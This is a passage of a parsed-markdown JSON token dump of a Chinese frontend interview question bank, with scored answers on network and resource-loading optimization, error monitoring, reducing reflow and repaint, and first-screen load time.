性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","text":"**1：** 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","text":" 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","task":false,"loose":false,"text":"**1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","tokens":[{"type":"text","raw":"**1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","text":"**1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","text":" 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何进行前端网络优化\\n\\n","depth":2,"text":"如何进行前端网络优化","tokens":[{"type":"text","raw":"如何进行前端网络优化","text":"如何进行前端网络优化","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用CDN加速静态资源的加载，减少网络延迟。\\n- **1：** 启用HTTP/2协议，提高多个资源并行加载的效率。\\n- **1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。\\n- **1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。\\n- **1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用CDN加速静态资源的加载，减少网络延迟。\\n","task":false,"loose":false,"text":"**1：** 使用CDN加速静态资源的加载，减少网络延迟。","tokens":[{"type":"text","raw":"**1：** 使用CDN加速静态资源的加载，减少网络延迟。","text":"**1：** 使用CDN加速静态资源的加载，减少网络延迟。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用CDN加速静态资源的加载，减少网络延迟。","text":" 使用CDN加速静态资源的加载，减少网络延迟。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 启用HTTP/2协议，提高多个资源并行加载的效率。\\n","task":false,"loose":false,"text":"**1：** 启用HTTP/2协议，提高多个资源并行加载的效率。","tokens":[{"type":"text","raw":"**1：** 启用HTTP/2协议，提高多个资源并行加载的效率。","text":"**1：** 启用HTTP/2协议，提高多个资源并行加载的效率。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 启用HTTP/2协议，提高多个资源并行加载的效率。","text":" 启用HTTP/2协议，提高多个资源并行加载的效率。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。\\n","task":false,"loose":false,"text":"**1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","tokens":[{"type":"text","raw":"**1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","text":"**1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","text":" 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。\\n","task":false,"loose":false,"text":"**1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","tokens":[{"type":"text","raw":"**1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","text":"**1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","text":" 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","task":false,"loose":false,"text":"**1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","tokens":[{"type":"text","raw":"**1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","text":"**1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","text":" 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何进行前端资源加载优化\\n\\n","depth":2,"text":"如何进行前端资源加载优化","tokens":[{"type":"text","raw":"如何进行前端资源加载优化","text":"如何进行前端资源加载优化","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。\\n- **1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。\\n- **1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。\\n- **1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。\\n","task":false,"loose":false,"text":"**1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","tokens":[{"type":"text","raw":"**1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","text":"**1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","text":" 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。\\n","task":false,"loose":false,"text":"**1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。","tokens":[{"type":"text","raw":"**1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。","text":"**1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用懒加载技术，按需加载页面内容，减少首次加载时间。","text":" 使用懒加载技术，按需加载页面内容，减少首次加载时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。\\n","task":false,"loose":false,"text":"**1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","tokens":[{"type":"text","raw":"**1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","text":"**1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","text":" 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","task":false,"loose":false,"text":"**1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","tokens":[{"type":"text","raw":"**1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","text":"**1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","text":" 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 前端错误监控的方案\\n\\n","depth":2,"text":"前端错误监控的方案","tokens":[{"type":"text","raw":"前端错误监控的方案","text":"前端错误监控的方案","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。\\n- **1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。\\n- **1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。\\n- **1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。\\n","task":false,"loose":false,"text":"**1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","tokens":[{"type":"text","raw":"**1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","text":"**1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","text":" Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。\\n","task":false,"loose":false,"text":"**1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","tokens":[{"type":"text","raw":"**1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","text":"**1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","text":" JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。\\n","task":false,"loose":false,"text":"**1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","tokens":[{"type":"text","raw":"**1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","text":"**1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","text":" 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","task":false,"loose":false,"text":"**1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","tokens":[{"type":"text","raw":"**1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","text":"**1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","text":" 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何减少页面的回流和重绘？\\n\\n","depth":2,"text":"如何减少页面的回流和重绘？","tokens":[{"type":"text","raw":"如何减少页面的回流和重绘？","text":"如何减少页面的回流和重绘？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 合并DOM操作：\\n  + 使用文档片段（DocumentFragment）批量插入节点\\n  + 使用innerHTML一次性插入大量内容\\n  + 使用display: none隐藏元素后再进行多次操作，最后再显示\\n\\n- **1：** 缓存布局信息：\\n  + 避免在循环中多次读取offset、scroll等属性\\n  + 使用变量缓存布局信息\\n\\n- **1：** 使用CSS3特性：\\n  + 使用transform和opacity替代top、left等属性\\n  + 使用will-change提示浏览器优化\\n\\n- **1：** 减少复杂的选择器：\\n  + 避免使用过于复杂的CSS选择器\\n  + 使用类选择器代替后代选择器\\n\\n- **1：** 优化动画和过渡：\\n  + 使用requestAnimationFrame进行动画\\n  + 避免在动画中使用高开销的CSS属性","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 合并DOM操作：\\n  + 使用文档片段（DocumentFragment）批量插入节点\\n  + 使用innerHTML一次性插入大量内容\\n  + 使用display: none隐藏元素后再进行多次操作，最后再显示\\n\\n","task":false,"loose":true,"text":"**1：** 合并DOM操作：\\n+ 使用文档片段（DocumentFragment）批量插入节点\\n+ 使用innerHTML一次性插入大量内容\\n+ 使用display: none隐藏元素后再进行多次操作，最后再显示\\n","tokens":[{"type":"text","raw":"**1：** 合并DOM操作：\\n","text":"**1：** 合并DOM操作：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合并DOM操作：","text":" 合并DOM操作：","escaped":false}]},{"type":"list","raw":"+ 使用文档片段（DocumentFragment）批量插入节点\\n+ 使用innerHTML一次性插入大量内容\\n+ 使用display: none隐藏元素后再进行多次操作，最后再显示\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用文档片段（DocumentFragment）批量插入节点\\n","task":false,"loose":false,"text":"使用文档片段（DocumentFragment）批量插入节点","tokens":[{"type":"text","raw":"使用文档片段（DocumentFragment）批量插入节点","text":"使用文档片段（DocumentFragment）批量插入节点","tokens":[{"type":"text","raw":"使用文档片段（DocumentFragment）批量插入节点","text":"使用文档片段（DocumentFragment）批量插入节点","escaped":false}]}]},{"type":"list_item","raw":"+ 使用innerHTML一次性插入大量内容\\n","task":false,"loose":false,"text":"使用innerHTML一次性插入大量内容","tokens":[{"type":"text","raw":"使用innerHTML一次性插入大量内容","text":"使用innerHTML一次性插入大量内容","tokens":[{"type":"text","raw":"使用innerHTML一次性插入大量内容","text":"使用innerHTML一次性插入大量内容","escaped":false}]}]},{"type":"list_item","raw":"+ 使用display: none隐藏元素后再进行多次操作，最后再显示","task":false,"loose":false,"text":"使用display: none隐藏元素后再进行多次操作，最后再显示","tokens":[{"type":"text","raw":"使用display: none隐藏元素后再进行多次操作，最后再显示","text":"使用display: none隐藏元素后再进行多次操作，最后再显示","tokens":[{"type":"text","raw":"使用display: none隐藏元素后再进行多次操作，最后再显示","text":"使用display: none隐藏元素后再进行多次操作，最后再显示","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 缓存布局信息：\\n  + 避免在循环中多次读取offset、scroll等属性\\n  + 使用变量缓存布局信息\\n\\n","task":false,"loose":true,"text":"**1：** 缓存布局信息：\\n+ 避免在循环中多次读取offset、scroll等属性\\n+ 使用变量缓存布局信息\\n","tokens":[{"type":"text","raw":"**1：** 缓存布局信息：\\n","text":"**1：** 缓存布局信息：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 缓存布局信息：","text":" 缓存布局信息：","escaped":false}]},{"type":"list","raw":"+ 避免在循环中多次读取offset、scroll等属性\\n+ 使用变量缓存布局信息\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 避免在循环中多次读取offset、scroll等属性\\n","task":false,"loose":false,"text":"避免在循环中多次读取offset、scroll等属性","tokens":[{"type":"text","raw":"避免在循环中多次读取offset、scroll等属性","text":"避免在循环中多次读取offset、scroll等属性","tokens":[{"type":"text","raw":"避免在循环中多次读取offset、scroll等属性","text":"避免在循环中多次读取offset、scroll等属性","escaped":false}]}]},{"type":"list_item","raw":"+ 使用变量缓存布局信息","task":false,"loose":false,"text":"使用变量缓存布局信息","tokens":[{"type":"text","raw":"使用变量缓存布局信息","text":"使用变量缓存布局信息","tokens":[{"type":"text","raw":"使用变量缓存布局信息","text":"使用变量缓存布局信息","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用CSS3特性：\\n  + 使用transform和opacity替代top、left等属性\\n  + 使用will-change提示浏览器优化\\n\\n","task":false,"loose":true,"text":"**1：** 使用CSS3特性：\\n+ 使用transform和opacity替代top、left等属性\\n+ 使用will-change提示浏览器优化\\n","tokens":[{"type":"text","raw":"**1：** 使用CSS3特性：\\n","text":"**1：** 使用CSS3特性：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用CSS3特性：","text":" 使用CSS3特性：","escaped":false}]},{"type":"list","raw":"+ 使用transform和opacity替代top、left等属性\\n+ 使用will-change提示浏览器优化\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用transform和opacity替代top、left等属性\\n","task":false,"loose":false,"text":"使用transform和opacity替代top、left等属性","tokens":[{"type":"text","raw":"使用transform和opacity替代top、left等属性","text":"使用transform和opacity替代top、left等属性","tokens":[{"type":"text","raw":"使用transform和opacity替代top、left等属性","text":"使用transform和opacity替代top、left等属性","escaped":false}]}]},{"type":"list_item","raw":"+ 使用will-change提示浏览器优化","task":false,"loose":false,"text":"使用will-change提示浏览器优化","tokens":[{"type":"text","raw":"使用will-change提示浏览器优化","text":"使用will-change提示浏览器优化","tokens":[{"type":"text","raw":"使用will-change提示浏览器优化","text":"使用will-change提示浏览器优化","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 减少复杂的选择器：\\n  + 避免使用过于复杂的CSS选择器\\n  + 使用类选择器代替后代选择器\\n\\n","task":false,"loose":true,"text":"**1：** 减少复杂的选择器：\\n+ 避免使用过于复杂的CSS选择器\\n+ 使用类选择器代替后代选择器\\n","tokens":[{"type":"text","raw":"**1：** 减少复杂的选择器：\\n","text":"**1：** 减少复杂的选择器：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少复杂的选择器：","text":" 减少复杂的选择器：","escaped":false}]},{"type":"list","raw":"+ 避免使用过于复杂的CSS选择器\\n+ 使用类选择器代替后代选择器\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 避免使用过于复杂的CSS选择器\\n","task":false,"loose":false,"text":"避免使用过于复杂的CSS选择器","tokens":[{"type":"text","raw":"避免使用过于复杂的CSS选择器","text":"避免使用过于复杂的CSS选择器","tokens":[{"type":"text","raw":"避免使用过于复杂的CSS选择器","text":"避免使用过于复杂的CSS选择器","escaped":false}]}]},{"type":"list_item","raw":"+ 使用类选择器代替后代选择器","task":false,"loose":false,"text":"使用类选择器代替后代选择器","tokens":[{"type":"text","raw":"使用类选择器代替后代选择器","text":"使用类选择器代替后代选择器","tokens":[{"type":"text","raw":"使用类选择器代替后代选择器","text":"使用类选择器代替后代选择器","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 优化动画和过渡：\\n  + 使用requestAnimationFrame进行动画\\n  + 避免在动画中使用高开销的CSS属性","task":false,"loose":true,"text":"**1：** 优化动画和过渡：\\n+ 使用requestAnimationFrame进行动画\\n+ 避免在动画中使用高开销的CSS属性","tokens":[{"type":"text","raw":"**1：** 优化动画和过渡：\\n","text":"**1：** 优化动画和过渡：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化动画和过渡：","text":" 优化动画和过渡：","escaped":false}]},{"type":"list","raw":"+ 使用requestAnimationFrame进行动画\\n+ 避免在动画中使用高开销的CSS属性","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用requestAnimationFrame进行动画\\n","task":false,"loose":false,"text":"使用requestAnimationFrame进行动画","tokens":[{"type":"text","raw":"使用requestAnimationFrame进行动画","text":"使用requestAnimationFrame进行动画","tokens":[{"type":"text","raw":"使用requestAnimationFrame进行动画","text":"使用requestAnimationFrame进行动画","escaped":false}]}]},{"type":"list_item","raw":"+ 避免在动画中使用高开销的CSS属性","task":false,"loose":false,"text":"避免在动画中使用高开销的CSS属性","tokens":[{"type":"text","raw":"避免在动画中使用高开销的CSS属性","text":"避免在动画中使用高开销的CSS属性","tokens":[{"type":"text","raw":"避免在动画中使用高开销的CSS属性","text":"避免在动画中使用高开销的CSS属性","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何优化首屏加载时间？\\n\\n","depth":2,"text":"如何优化首屏加载时间？","tokens":[{"type":"text","raw":"如何优化首屏加载时间？","text":"如何优化首屏加载时间？","escaped":false}]},{"type":"heading","raw":"#### 类型：`高级`\\n\\n","depth":4,"text":"类型：`高级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`高级`","text":"高级"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **1：** 资源压缩与合并：\\n  + 使用工具压缩JavaScript、CSS和HTML\\n  + 合并多个CSS和JavaScript文件\\n\\n- **1：** 使用CDN：\\n  + 将静态资源托管到CDN上\\n  + 减少资源加载的延迟\\n\\n- **1：** 图片优化：\\n  + 使用合适的图片格式（如WebP）\\n  + 使用图片懒加载\\n  + 使用CSS Sprites合并小图标\\n\\n- **1：** 服务器端渲染（SSR）：\\n  + 使用SSR生成首屏HTML\\n  + 减少客户端渲染的时间\\n\\n- **1：** 减少HTTP请求：\\n  + 使用HTTP/2多路复用\\n  + 合并请求，减少请求数量","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 资源压缩与合并：\\n  + 使用工具压缩JavaScript、CSS和HTML\\n  + 合并多个CSS和JavaScript文件\\n\\n","task":false,"loose":true,"text":"**1：** 资源压缩与合并：\\n+ 使用工具压缩JavaScript、CSS和HTML\\n+ 合并多个CSS和JavaScript文件\\n","tokens":[{"type":"text","raw":"**1：** 资源压缩与合并：\\n","text":"**1：** 资源压缩与合并：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 资源压缩与合并：","text":" 资源压缩与合并：","escaped":false}]},{"type":"list","raw":"+ 使用工具压缩JavaScript、CSS和HTML\\n+ 合并多个CSS和JavaScript文件\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用工具压缩JavaScript、CSS和HTML\\n","task":false,"loose":false,"text":"使用工具压缩JavaScript、CSS和HTML","tokens":[{"type":"text","raw":"使用工具压缩JavaScript、CSS和HTML","text":"使用工具压缩JavaScript、CSS和HTML","tokens":[{"type":"text","raw":"使用工具压缩JavaScript、CSS和HTML","text":"使用工具压缩JavaScript、CSS和HTML","escaped":false}]}]},{"type":"list_item","raw":"+ 